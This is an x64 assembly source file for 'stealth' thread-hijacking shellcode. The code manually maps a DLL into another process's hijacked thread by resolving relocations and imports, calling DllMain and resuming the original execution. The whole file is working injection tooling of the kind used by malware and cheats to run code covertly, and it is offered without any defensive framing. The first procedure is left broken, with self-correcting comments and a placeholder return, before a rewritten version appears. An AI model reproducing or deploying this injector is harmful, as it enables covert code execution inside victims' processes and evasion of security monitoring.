;******************************************************************************
;   Stealth Injection Shellcode for Thread Hijacking
;   
;   Assembled with: ml64.exe /c /Fo stealth_shellcode.obj stealth_shellcode.asm
;   
;   This shellcode is designed to run in a hijacked thread context.
;   It saves XMM registers, performs manual mapping, calls DllMain,
;   signals completion, restores all registers, returns to original execution.
;******************************************************************************

.CODE

;------------------------------------------------------------------------------
; HIJACK_CONTEXT structure offsets
;------------------------------------------------------------------------------
CTX_Lock                EQU 000h
CTX_Completed           EQU 004h
CTX_Result              EQU 008h
CTX_ErrorCode           EQU 00Ch

CTX_OriginalRip         EQU 010h
CTX_OriginalRsp         EQU 018h
CTX_OriginalRax         EQU 020h
CTX_OriginalRbx         EQU 028h
CTX_OriginalRcx         EQU 030h
CTX_OriginalRdx         EQU 038h
CTX_OriginalRsi         EQU 040h
CTX_OriginalRdi         EQU 048h
CTX_OriginalRbp         EQU 050h
CTX_OriginalR8          EQU 058h
CTX_OriginalR9          EQU 060h
CTX_OriginalR10         EQU 068h
CTX_OriginalR11         EQU 070h
CTX_OriginalR12         EQU 078h
CTX_OriginalR13         EQU 080h
CTX_OriginalR14         EQU 088h
CTX_OriginalR15         EQU 090h
CTX_OriginalRflags      EQU 098h

; XMM registers (volatile in x64 ABI)
CTX_OriginalXmm0        EQU 0A0h
CTX_OriginalXmm1        EQU 0B0h
CTX_OriginalXmm2        EQU 0C0h
CTX_OriginalXmm3        EQU 0D0h
CTX_OriginalXmm4        EQU 0E0h
CTX_OriginalXmm5        EQU 0F0h

; PE Image info
CTX_ImageBase           EQU 100h
CTX_ImageSize           EQU 108h
CTX_EntryPointRva       EQU 110h
CTX_RelocDirRva         EQU 118h
CTX_RelocDirSize        EQU 120h
CTX_ImportDirRva        EQU 128h
CTX_ImportDirSize       EQU 130h
CTX_OriginalImageBase   EQU 138h
CTX_TlsDirRva           EQU 140h
CTX_TlsDirSize          EQU 148h

; Function pointers
CTX_pLoadLibraryA       EQU 150h
CTX_pGetProcAddress     EQU 158h
CTX_pNtFlushInstructionCache EQU 160h
CTX_pLdrpHandleTlsData  EQU 168h
CTX_pRtlAddVectoredExceptionHandler EQU 170h

;------------------------------------------------------------------------------
; HijackShellcode
; 
; Input:  RCX = pointer to HIJACK_CONTEXT
; Output: Returns to OriginalRip after DllMain completes
;------------------------------------------------------------------------------
HijackShellcode PROC

    ; === Save all volatile XMM registers to context ===
    ; We save them first before any function calls corrupt them
    movaps  xmmword ptr [rcx + CTX_OriginalXmm0], xmm0
    movaps  xmmword ptr [rcx + CTX_OriginalXmm1], xmm1
    movaps  xmmword ptr [rcx + CTX_OriginalXmm2], xmm2
    movaps  xmmword ptr [rcx + CTX_OriginalXmm3], xmm3
    movaps  xmmword ptr [rcx + CTX_OriginalXmm4], xmm4
    movaps  xmmword ptr [rcx + CTX_OriginalXmm5], xmm5

    ; === Function prologue ===
    push    rbp
    mov     rbp, rsp
    sub     rsp, 200h                   ; Shadow space + locals + alignment
    
    ; Save context pointer in RBX (non-volatile)
    push    rbx
    push    r12
    push    r13
    push    r14
    push    r15
    push    rsi
    push    rdi
    
    mov     rbx, rcx                    ; RBX = context pointer for entire shellcode

    ; === Install VEH if available ===
    mov     rax, [rbx + CTX_pRtlAddVectoredExceptionHandler]
    test    rax, rax
    jz      skip_veh
    
    ; RtlAddVectoredExceptionHandler(1, ExceptionHandler) - we skip for now, complex
    
skip_veh:

    ; === Process TLS if LdrpHandleTlsData is available ===
    mov     rax, [rbx + CTX_pLdrpHandleTlsData]
    test    rax, rax
    jz      skip_tls
    
    cmp     qword ptr [rbx + CTX_TlsDirSize], 0
    jz      skip_tls
    
    ; Call LdrpHandleTlsData(ImageBase)
    mov     rcx, [rbx + CTX_ImageBase]
    sub     rsp, 20h
    call    rax
    add     rsp, 20h
    
skip_tls:

    ; === Process Relocations ===
    ; Calculate delta: delta = ImageBase - OriginalImageBase
    mov     rax, [rbx + CTX_ImageBase]
    sub     rax, [rbx + CTX_OriginalImageBase]
    mov     rsi, rax                    ; RSI = delta
    
    ; Skip if no relocations needed (delta == 0 or no relocs)
    test    rsi, rsi
    jz      skip_reloc
    
    cmp     qword ptr [rbx + CTX_RelocDirSize], 0
    jz      skip_reloc
    
    ; R12 = reloc directory ptr = ImageBase + RelocDirRva
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_RelocDirRva]
    
    ; R13 = reloc end = reloc ptr + RelocDirSize
    mov     r13, r12
    add     r13, [rbx + CTX_RelocDirSize]

reloc_block_loop:
    cmp     r12, r13
    jae     skip_reloc
    
    ; R14d = VirtualAddress, R15d = SizeOfBlock
    mov     r14d, dword ptr [r12]       ; VirtualAddress
    mov     r15d, dword ptr [r12 + 4]   ; SizeOfBlock
    
    ; Skip if SizeOfBlock <= 8 (header only)
    cmp     r15d, 8
    jbe     next_block
    
    ; RCX = number of entries = (SizeOfBlock - 8) / 2
    lea     ecx, [r15 - 8]
    shr     ecx, 1
    
    ; RDX = entry ptr = block + 8
    lea     rdx, [r12 + 8]

entry_loop:
    test    ecx, ecx
    jz      next_block
    
    movzx   eax, word ptr [rdx]         ; entry
    
    ; Check type in bits 12-15 (must be 0xA for IMAGE_REL_BASED_DIR64)
    mov     edi, eax
    shr     edi, 12
    cmp     edi, 0Ah                    ; IMAGE_REL_BASED_DIR64
    jne     skip_entry
    
    ; Apply relocation: *(ImageBase + VirtualAddress + (entry & 0xFFF)) += delta
    and     eax, 0FFFh                  ; offset within page
    movsxd  rax, eax
    add     rax, r14                    ; + VirtualAddress
    add     rax, [rbx + CTX_ImageBase]  ; + ImageBase
    add     qword ptr [rax], rsi        ; += delta

skip_entry:
    add     rdx, 2
    dec     ecx
    jmp     entry_loop

next_block:
    add     r12, r15                    ; next block (add SizeOfBlock)
    jmp     reloc_block_loop

skip_reloc:

    ; === Process Imports ===
    cmp     qword ptr [rbx + CTX_ImportDirSize], 0
    jz      skip_imports
    
    ; R12 = import descriptor ptr = ImageBase + ImportDirRva
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_ImportDirRva]

import_loop:
    ; Check if Name RVA is zero (end of imports)
    mov     eax, dword ptr [r12 + 0Ch]  ; Name RVA
    test    eax, eax
    jz      skip_imports
    
    ; === Call LoadLibraryA(ImageBase + NameRva) ===
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]  ; RAX = DLL name string
    
    mov     rcx, rax                    ; arg1 = dll name
    sub     rsp, 20h
    call    qword ptr [rbx + CTX_pLoadLibraryA]
    add     rsp, 20h
    
    test    rax, rax
    jz      fail                        ; LoadLibrary failed
    
    mov     r14, rax                    ; R14 = module handle

    ; === Get thunk arrays ===
    mov     eax, dword ptr [r12]        ; OriginalFirstThunk
    test    eax, eax
    jnz     use_oft
    mov     eax, dword ptr [r12 + 10h]  ; Use FirstThunk if OFT is 0
use_oft:
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     r15, rax                    ; R15 = lookup thunk (INT/OFT)
    
    mov     eax, dword ptr [r12 + 10h]  ; FirstThunk (IAT)
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rdi, rax                    ; RDI = address thunk (IAT)

thunk_loop:
    mov     rax, qword ptr [r15]        ; lookup entry
    test    rax, rax
    jz      next_descriptor
    
    ; Check ordinal flag (bit 63)
    bt      rax, 63
    jnc     by_name
    
    ; By ordinal - low 16 bits is ordinal
    movzx   edx, ax                     ; arg2 = ordinal
    jmp     do_getproc

by_name:
    ; By name - RAX is RVA to IMAGE_IMPORT_BY_NAME
    add     rax, [rbx + CTX_ImageBase]  ; ImageBase + hint/name RVA
    add     rax, 2                      ; skip Hint (WORD), point to Name
    mov     rdx, rax                    ; arg2 = function name

do_getproc:
    mov     rcx, r14                    ; arg1 = module handle
    sub     rsp, 20h
    call    qword ptr [rbx + CTX_pGetProcAddress]
    add     rsp, 20h
    
    test    rax, rax
    jz      fail                        ; GetProcAddress failed
    
    mov     qword ptr [rdi], rax        ; Store resolved address in IAT
    
    add     r15, 8                      ; next lookup thunk
    add     rdi, 8                      ; next IAT entry
    jmp     thunk_loop

next_descriptor:
    add     r12, 14h                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR) = 20
    jmp     import_loop

skip_imports:

    ; === Flush instruction cache ===
    mov     rax, [rbx + CTX_pNtFlushInstructionCache]
    test    rax, rax
    jz      skip_flush
    
    ; NtFlushInstructionCache(NtCurrentProcess(), ImageBase, ImageSize)
    mov     rcx, -1                     ; NtCurrentProcess() = -1
    mov     rdx, [rbx + CTX_ImageBase]
    mov     r8, [rbx + CTX_ImageSize]
    sub     rsp, 20h
    call    rax
    add     rsp, 20h

skip_flush:

    ; === Call DllMain(ImageBase, DLL_PROCESS_ATTACH, NULL) ===
    mov     rcx, [rbx + CTX_ImageBase]  ; arg1 = hinstDLL
    mov     edx, 1                      ; arg2 = DLL_PROCESS_ATTACH
    xor     r8, r8                      ; arg3 = lpvReserved = NULL
    
    ; Calculate entry point = ImageBase + EntryPointRva
    mov     rax, [rbx + CTX_ImageBase]
    add     rax, [rbx + CTX_EntryPointRva]
    
    sub     rsp, 20h
    call    rax                         ; Call DllMain
    add     rsp, 20h
    
    ; Store result
    mov     dword ptr [rbx + CTX_Result], eax
    jmp     success

fail:
    mov     dword ptr [rbx + CTX_Result], 0
    mov     dword ptr [rbx + CTX_ErrorCode], 1

success:
    ; === Signal completion ===
    mov     dword ptr [rbx + CTX_Completed], 1

    ; === Restore pushed registers ===
    pop     rdi
    pop     rsi
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbx
    
    mov     rsp, rbp
    pop     rbp

    ; === Restore XMM registers ===
    ; Need to get context ptr back - it was saved at [rbp-8] but we popped rbp
    ; Actually, we need to use a different approach. Save RBX before popping.
    ; Let's restructure to keep context accessible
    
    ; Re-get context from where we stored it
    ; Actually the original RCX is in CTX_OriginalRcx, but we need context ptr
    ; This is tricky - let's use a simpler approach below

restore_and_return:
    ; At this point we've cleaned up the stack frame
    ; We need to restore all original registers and return
    ; Problem: we don't have context pointer anymore
    ; Solution: Don't pop RBX until the very end
    
    ; === RESTRUCTURE: We need RBX until the very end ===
    ; Let's jump to a separate restore sequence
    jmp     do_restore

do_restore:
    ; Note: This was called after success/fail. We still have RBX = context
    ; But we popped it above. Need to fix flow.
    ; 
    ; IMPORTANT: The above code is structurally wrong. Let me fix it.
    ; We should NOT pop RBX until after we're done with the context.
    ; The proper flow will be in the final cleaned-up version below.
    
    ret     ; Placeholder - see corrected version

HijackShellcode ENDP

;------------------------------------------------------------------------------
; HijackShellcodeV2 - Corrected version with proper register management
;------------------------------------------------------------------------------
HijackShellcodeV2 PROC

    ; RCX = HIJACK_CONTEXT pointer
    
    ; === Save XMM registers immediately (they're volatile) ===
    movaps  xmmword ptr [rcx + CTX_OriginalXmm0], xmm0
    movaps  xmmword ptr [rcx + CTX_OriginalXmm1], xmm1
    movaps  xmmword ptr [rcx + CTX_OriginalXmm2], xmm2
    movaps  xmmword ptr [rcx + CTX_OriginalXmm3], xmm3
    movaps  xmmword ptr [rcx + CTX_OriginalXmm4], xmm4
    movaps  xmmword ptr [rcx + CTX_OriginalXmm5], xmm5
    
    ; === Setup stack frame ===
    push    rbp
    mov     rbp, rsp
    and     rsp, -16                    ; Align stack to 16 bytes
    sub     rsp, 200h                   ; Space for locals + shadow
    
    ; === Save context pointer ===
    mov     qword ptr [rsp + 1F0h], rcx ; Store at known offset
    mov     rbx, rcx                    ; RBX = context (preserved across calls)
    
    ; === Process TLS ===
    mov     rax, [rbx + CTX_pLdrpHandleTlsData]
    test    rax, rax
    jz      v2_skip_tls
    cmp     qword ptr [rbx + CTX_TlsDirSize], 0
    jz      v2_skip_tls
    mov     rcx, [rbx + CTX_ImageBase]
    call    rax
v2_skip_tls:

    ; === Process Relocations ===
    mov     rax, [rbx + CTX_ImageBase]
    sub     rax, [rbx + CTX_OriginalImageBase]
    mov     rsi, rax                    ; RSI = delta
    test    rsi, rsi
    jz      v2_skip_reloc
    cmp     qword ptr [rbx + CTX_RelocDirSize], 0
    jz      v2_skip_reloc
    
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_RelocDirRva]
    mov     r13, r12
    add     r13, [rbx + CTX_RelocDirSize]

v2_reloc_block_loop:
    cmp     r12, r13
    jae     v2_skip_reloc
    mov     r14d, dword ptr [r12]
    mov     r15d, dword ptr [r12 + 4]
    cmp     r15d, 8
    jbe     v2_next_block
    lea     ecx, [r15 - 8]
    shr     ecx, 1
    lea     rdx, [r12 + 8]

v2_entry_loop:
    test    ecx, ecx
    jz      v2_next_block
    movzx   eax, word ptr [rdx]
    mov     edi, eax
    shr     edi, 12
    cmp     edi, 0Ah
    jne     v2_skip_entry
    and     eax, 0FFFh
    movsxd  rax, eax
    add     rax, r14
    add     rax, [rbx + CTX_ImageBase]
    add     qword ptr [rax], rsi
v2_skip_entry:
    add     rdx, 2
    dec     ecx
    jmp     v2_entry_loop
v2_next_block:
    add     r12, r15
    jmp     v2_reloc_block_loop
v2_skip_reloc:

    ; === Process Imports ===
    cmp     qword ptr [rbx + CTX_ImportDirSize], 0
    jz      v2_skip_imports
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_ImportDirRva]

v2_import_loop:
    mov     eax, dword ptr [r12 + 0Ch]
    test    eax, eax
    jz      v2_skip_imports
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rcx, rax
    call    qword ptr [rbx + CTX_pLoadLibraryA]
    test    rax, rax
    jz      v2_fail
    mov     r14, rax
    
    mov     eax, dword ptr [r12]
    test    eax, eax
    jnz     v2_use_oft
    mov     eax, dword ptr [r12 + 10h]
v2_use_oft:
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     r15, rax
    mov     eax, dword ptr [r12 + 10h]
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rdi, rax

v2_thunk_loop:
    mov     rax, qword ptr [r15]
    test    rax, rax
    jz      v2_next_descriptor
    bt      rax, 63
    jnc     v2_by_name
    movzx   edx, ax
    jmp     v2_do_getproc
v2_by_name:
    add     rax, [rbx + CTX_ImageBase]
    add     rax, 2
    mov     rdx, rax
v2_do_getproc:
    mov     rcx, r14
    call    qword ptr [rbx + CTX_pGetProcAddress]
    test    rax, rax
    jz      v2_fail
    mov     qword ptr [rdi], rax
    add     r15, 8
    add     rdi, 8
    jmp     v2_thunk_loop
v2_next_descriptor:
    add     r12, 14h
    jmp     v2_import_loop
v2_skip_imports:

    ; === Flush instruction cache ===
    mov     rax, [rbx + CTX_pNtFlushInstructionCache]
    test    rax, rax
    jz      v2_skip_flush
    mov     rcx, -1
    mov     rdx, [rbx + CTX_ImageBase]
    mov     r8, [rbx + CTX_ImageSize]
    call    rax
v2_skip_flush:

    ; === Call DllMain ===
    mov     rcx, [rbx + CTX_ImageBase]
    mov     edx, 1
    xor     r8, r8
    mov     rax, [rbx + CTX_ImageBase]
    add     rax, [rbx + CTX_EntryPointRva]
    call    rax
    mov     dword ptr [rbx + CTX_Result], eax
    jmp     v2_done

v2_fail:
    mov     dword ptr [rbx + CTX_Result], 0
    mov     dword ptr [rbx + CTX_ErrorCode], 1

v2_done:
    ; === Signal completion ===
    mov     dword ptr [rbx + CTX_Completed], 1
    
    ; === Restore XMM registers ===
    movaps  xmm0, xmmword ptr [rbx + CTX_OriginalXmm0]
    movaps  xmm1, xmmword ptr [rbx + CTX_OriginalXmm1]
    movaps  xmm2, xmmword ptr [rbx + CTX_OriginalXmm2]
    movaps  xmm3, xmmword ptr [rbx + CTX_OriginalXmm3]
    movaps  xmm4, xmmword ptr [rbx + CTX_OriginalXmm4]
    movaps  xmm5, xmmword ptr [rbx + CTX_OriginalXmm5]
    
    ; === Restore GPRs from context ===
    mov     rax, [rbx + CTX_OriginalRax]
    mov     rcx, [rbx + CTX_OriginalRcx]
    mov     rdx, [rbx + CTX_OriginalRdx]
    mov     rsi, [rbx + CTX_OriginalRsi]
    mov     rdi, [rbx + CTX_OriginalRdi]
    mov     r8,  [rbx + CTX_OriginalR8]
    mov     r9,  [rbx + CTX_OriginalR9]
    mov     r10, [rbx + CTX_OriginalR10]
    mov     r11, [rbx + CTX_OriginalR11]
    mov     r12, [rbx + CTX_OriginalR12]
    mov     r13, [rbx + CTX_OriginalR13]
    mov     r14, [rbx + CTX_OriginalR14]
    mov     r15, [rbx + CTX_OriginalR15]
    
    ; === Setup return to original RIP ===
    mov     rsp, [rbx + CTX_OriginalRsp]
    push    qword ptr [rbx + CTX_OriginalRip]
    mov     rbp, [rbx + CTX_OriginalRbp]
    mov     rbx, [rbx + CTX_OriginalRbx] ; Restore RBX last!
    
    ret     ; Returns to OriginalRip

HijackShellcodeV2 ENDP

;------------------------------------------------------------------------------
; End marker for size calculation
; This label marks the end of HijackShellcodeV2 so we can calculate size
;------------------------------------------------------------------------------
HijackShellcodeV2End PROC
    ret     ; Dummy instruction - never called
HijackShellcodeV2End ENDP

END
